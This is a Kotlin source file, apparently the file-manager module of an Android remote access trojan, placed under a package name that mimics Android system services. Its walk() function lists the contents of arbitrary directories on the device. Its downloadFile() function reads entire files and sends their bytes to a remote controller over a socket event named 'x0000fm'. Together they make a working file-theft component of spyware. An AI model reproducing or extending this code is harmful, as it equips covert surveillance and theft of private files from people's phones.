package com.android.background.services.helpers

import android.util.Log
import com.android.background.services.IOSocket
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject
import java.io.BufferedInputStream
import java.io.File
import java.io.FileInputStream
import java.io.FileNotFoundException
import java.io.IOException
import java.text.DecimalFormat
import kotlin.math.log10
import kotlin.math.pow

object FileManager {
    @JvmStatic
    fun walk(path: String?): JSONArray {
        val values = JSONArray()
        val dir = File(path ?: return values)
        if (!dir.canRead()) {
            Log.d("cannot", "inaccessible")
        }
        val list = dir.listFiles()
        try {
            if (list != null) {
                val parentObj = JSONObject()
                parentObj.put("name", "../")
                parentObj.put("isDir", true)
                parentObj.put("path", dir.parent)
                parentObj.put("size", "0")
                values.put(parentObj)
                for (file in list) {
                    val fileObj = JSONObject()
                    fileObj.put("name", file.name)
                    fileObj.put("isDir", file.isDirectory)
                    fileObj.put("path", file.absolutePath)
                    fileObj.put("size", fileSizeFormatter(file.length()))
                    values.put(fileObj)
                }
            }
        } catch (e: JSONException) {
            e.printStackTrace()
        }
        return values
    }

    @JvmStatic
    fun downloadFile(path: String?) {
        if (path == null) return
        val file = File(path)
        if (file.exists()) {
            try {
                val size = file.length()
                // Safety limit: files larger than 20MB won't be downloaded over socket
                val MAX_DOWNLOAD_SIZE = 20L * 1024 * 1024
                if (size > MAX_DOWNLOAD_SIZE) {
                    Log.e("FileManager", "File too large to download over socket: $size bytes")
                    return
                }
                val data = ByteArray(size.toInt())
                BufferedInputStream(FileInputStream(file)).use { buf ->
                    var offset = 0
                    while (offset < data.size) {
                        val bytesRead = buf.read(data, offset, data.size - offset)
                        if (bytesRead == -1) break
                        offset += bytesRead
                    }
                    val `object` = JSONObject()
                    `object`.put("file", true)
                    `object`.put("name", file.name)
                    `object`.put("buffer", data)
                    IOSocket.getInstance().ioSocket.emit("x0000fm", `object`)
                }
            } catch (e: Exception) {
                when (e) {
                    is FileNotFoundException, is IOException, is JSONException -> e.printStackTrace()
                    else -> throw e
                }
            }
        }
    }

    @JvmStatic
    fun fileSizeFormatter(size: Long): String {
        if (size <= 0) return "?"
        val units = arrayOf("B", "KB", "MB", "GB", "TB")
        val digitGroups = (log10(size.toDouble()) / log10(1024.0)).toInt()
        return DecimalFormat("#,##0.#").format(size / 1024.0.pow(digitGroups.toDouble())) + " " + units[digitGroups]
    }
}
